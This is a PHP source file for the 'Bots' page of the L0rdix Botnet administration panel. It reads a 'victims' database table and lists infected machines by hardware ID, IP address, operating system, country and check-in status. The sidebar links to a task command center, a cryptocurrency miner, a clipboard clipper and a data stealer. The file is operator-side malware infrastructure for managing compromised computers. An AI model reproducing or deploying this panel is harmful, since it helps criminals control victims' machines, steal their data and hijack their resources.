<?php
session_start();

  if($_SESSION['logged']!="true")
  {
    header("Location: index.php");
    die();
  }


include_once '../includes/db.php'

 ?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
<title>L0rdix Botnet</title>

<!-- Favicon -->
<link rel="shortcut icon" href="images/favicon.ico" />

<!-- Font -->
<link  rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:200,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900">

<!-- css -->
<link rel="stylesheet" type="text/css" href="css/style.css" />

</head>

<body>

<div class="wrapper">

<!--=================================
 preloader -->

<div id="pre-loader">
    <img src="images/pre-loader/loader-01.svg" alt="">
</div>

<!--=================================
 preloader -->

<!--=================================
 header start-->

<nav class="admin-header navbar navbar-default col-lg-12 col-12 p-0 fixed-top d-flex flex-row">
  <!-- logo -->
  <div class="text-left navbar-brand-wrapper">
    <a class="navbar-brand brand-logo" href="dashboard.php"><img src="images/logo-dark.png" alt="" ></a>
    <a class="navbar-brand brand-logo-mini" href="dashboard.php"><img src="images/logo-icon-dark.png" alt=""></a>
  </div>
  <!-- Top bar left -->
  <ul class="nav navbar-nav mr-auto">
    <li class="nav-item">
      <a id="button-toggle" class="button-toggle-nav inline-block ml-20 pull-left" href="javascript:void(0);"><i class="zmdi zmdi-menu ti-align-right"></i></a>
    </li>
    <li class="nav-item">
      <div class="search">
        <a class="search-btn not_click" href="javascript:void(0);"></a>
        <div class="search-box not-click">
          <input type="text" class="not-click form-control" placeholder="Under development" value="" name="search">
          <button class="search-button" type="submit"> <i class="fa fa-search not-click"></i></button>
        </div>
      </div>
    </li>
  </ul>
  <!-- top bar right -->
  <ul class="nav navbar-nav ml-auto">
    <li class="nav-item fullscreen">
      <a id="btnFullscreen" href="#" class="nav-link" ><i class="ti-fullscreen"></i></a>
    </li>
  </ul>
</nav>

<!--=================================
 header End-->

<!--=================================
 Main content -->

 <div class="container-fluid">
     <div class="row">
         <!-- Left Sidebar start-->
         <div class="side-menu-fixed">
             <div class="scrollbar side-menu-bg">
                 <ul class="nav navbar-nav side-menu" id="sidebarnav">
                     <!-- menu item Dashboard-->
                     <li>
                         <a href="dashboard.php">
                             <div class="pull-left"><i class="fa fa-dashboard"></i><span class="right-nav-text">Dashboard</span></div>
                             <div class="clearfix"></div>
                         </a>
                     </li>
                     <!-- menu title -->
                     <li class="mt-10 mb-10 text-muted pl-4 font-medium menu-title">Components </li>
                     <!-- menu item Elements-->
                     <li>
                         <a href="bots.php">
                             <div class="pull-left"><i class="fa fa-users"></i><span class="right-nav-text">Bots</span></div>
                             <div class="clearfix"></div>
                         </a>
                     </li>
                     <!-- menu item calendar-->
                     <li>
                         <a href="javascript:void(0);" data-toggle="collapse" data-target="#calendar-menu">
                             <div class="pull-left"><i class="fa  fa-code"></i><span class="right-nav-text">Command center</span></div>
                             <div class="pull-right"><i class="ti-plus"></i></div>
                             <div class="clearfix"></div>
                         </a>
                         <ul id="calendar-menu" class="collapse" data-parent="#sidebarnav">
                             <li> <a href="tasks.php">Tasks</a> </li>
                             <li> <a href="success.php">Success list</a> </li>
                         </ul>
                     </li>
                     <!-- menu item todo-->
                     <li>
                         <a href="miner.php"><i class="fa fa-btc"></i><span class="right-nav-text">Miner</span> </a>
                     </li>
                     <!-- menu item chat-->
                     <li>
                         <a href="clipper.php"><i class="fa fa-paste"></i><span class="right-nav-text">Clipper </span></a>
                     </li>
                     <!-- menu item Charts-->
                     <li>
                         <a href="stealer.php">
                             <div class="pull-left"><i class="fa fa-folder"></i><span class="right-nav-text">Stealer</span></div>
                             <div class="clearfix"></div>
                         </a>
                     </li>
                     <!-- menu item mailbox-->

                     <!-- menu font icon-->
                     <li>
                         <a href="settings.php">
                             <div class="pull-left"><i class="fa fa-cogs"></i><span class="right-nav-text">Settings</span></div>
                             <div class="clearfix"></div>
                         </a>
                     </li>
                     <!-- menu title -->

                     <!-- menu item Multi level-->

                 </ul>
             </div>
         </div>
         <!-- Left Sidebar End-->


<!--=================================
 Main content -->

 <!--=================================
wrapper -->

  <div class="content-wrapper">
    <div class="page-title">
      <div class="row">
          <div class="col-sm-6">
              <h4 class="mb-0">Bots </h4>
          </div>
          <div class="col-sm-6">
            <ol class="breadcrumb pt-0 pr-0 float-left float-sm-right ">
              <li class="breadcrumb-item"><a href="dashboard.php" class="default-color">Home</a></li>
              <li class="breadcrumb-item active">Bots </li>
            </ol>
          </div>
        </div>
    </div>
    <!-- main body -->
    <div class="row">
      <div class="col-xl-12 mb-30">
        <div class="card card-statistics h-100">
          <div class="card-body">
            <div class="table-responsive">
            <table id="datatable" class="table table-striped table-bordered p-0">
              <thead>
                  <tr>
                      <th>No</th>
                      <th>HWID</th>
                      <th>Ip</th>
                      <th>OS</th>
                      <th>Profiles</th>
                      <th>Code</th>
                      <th>Country</th>
                      <th>Last response</th>
                      <th>Install date</th>
                      <th>Status</th>
                      <th>Profile</th>
                  </tr>
              </thead>
              <tbody>
                <?php
                $result = $pdo->prepare("SELECT id,hwid,os,profile,ip,country,last_response,install_date FROM victims");
                $result->execute();
                $result->bindColumn('id',$id);
                $result->bindColumn('hwid',$hwid);
                $result->bindColumn('os',$os);
                $result->bindColumn('profile',$profile);
                $result->bindColumn('ip',$ip);
                $result->bindColumn('country',$country);
                $result->bindColumn('last_response',$lr);
                $result->bindColumn('install_date',$date);
                $interval = $pdo->query("SELECT reconnect_interval FROM config")->fetchColumn();

                while ($result->fetch()) {
                  ?>
                  <tr role="row" class="odd">
                          <td class="sorting_1"><?php echo $id ?></td>
                          <td><?php echo $hwid ?></td>
                          <td><?php echo $ip ?></td>
                          <td><?php echo $os ?></td>
                          <td><?php echo $profile ?></td>
                          <td><?php echo $country ?></td>
                          <td><img src="img/flags/<?php echo strtolower($country) ?>.png" alt=""></td>
                          <td><?php echo date("Y-m-d H:i", $lr)?></td>
                          <td><?php echo date("Y-m-d H:i", $date) ?></td>
                          <td>
                            <?

                            $time = time()-((int)$interval*60);
                            $dead = time() - 604800;
                          if($lr >= $time)
                          {
                            ?>
                            <span class="label bg-success  pr-2" style="font-size:0.95rem">Active</span>
                            <?
                          }elseif($lr < $dead)
                          {
                            ?>
                              <span class="label bg-secondary pr-3" style="font-size:0.95rem">Dead</span>
                            <?
                          }else {
                            ?>
                              <span class="label bg-danger" style="font-size:0.95rem">Offline</span>
                            <?

                          }
                          ?></td>
                          <td><a href="profile.php?h=<?php echo $hwid ?>"><button class="btn bg-info text-white" style="font-size:0.95rem">show</button></a></td>
                      </tr>
                  <?
                }
                 ?>
              </tbody>
              <tfoot>
                  <tr>
                    <th>No</th>
                    <th>HWID</th>
                    <th>Ip</th>
                    <th>OS</th>
                    <th>Profiles</th>
                    <th>Code</th>
                    <th>Country</th>
                    <th>Last response</th>
                    <th>Install date</th>
                    <th>Status</th>
                    <th>Profile</th>
                  </tr>
              </tfoot>

           </table>
          </div>
          </div>
        </div>
      </div>
  </div>

 <!--=================================
 wrapper -->

<!--=================================
 footer -->


    </div>
  </div>
</div>
</div>

<!--=================================
 footer -->



<!--=================================
 jquery -->

<!-- jquery -->
<script src="js/jquery-3.3.1.min.js"></script>

<!-- plugins-jquery -->
<script src="js/plugins-jquery.js"></script>

<!-- plugin_path -->
<script>var plugin_path = 'js/';</script>

<!-- chart -->
<script src="js/chart-init.js"></script>

<!-- calendar -->
<script src="js/calendar.init.js"></script>

<!-- charts sparkline -->
<script src="js/sparkline.init.js"></script>

<!-- charts morris -->
<script src="js/morris.init.js"></script>

<!-- datepicker -->
<script src="js/datepicker.js"></script>

<!-- sweetalert2 -->
<script src="js/sweetalert2.js"></script>

<!-- toastr -->
<script src="js/toastr.js"></script>

<!-- validation -->
<script src="js/validation.js"></script>

<!-- lobilist -->
<script src="js/lobilist.js"></script>

<!-- custom -->
<script src="js/custom.js"></script>

</body>
</html>
